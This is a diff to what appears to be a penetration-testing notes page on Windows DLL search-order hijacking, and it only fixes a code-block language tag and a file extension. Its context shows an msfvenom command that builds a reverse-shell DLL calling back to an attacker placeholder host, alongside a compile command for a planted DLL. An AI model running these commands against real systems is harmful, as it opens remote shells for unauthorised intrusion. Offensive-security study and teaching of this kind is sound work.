@@ -32,7 +32,7 @@ Another approach is hijacking the DLL search order, where Windows looks for the 
 List applications on the machine:
 
 {% code overflow="wrap" %}
-```
+```powershell
 Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
 ```
 {% endcode %}
@@ -92,7 +92,7 @@ x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
 Alternatively, use `msfvenom` to generate the DLL:
 
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o TextShaping.sll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o TextShaping.dll
 ```
 
 ### Exploiting
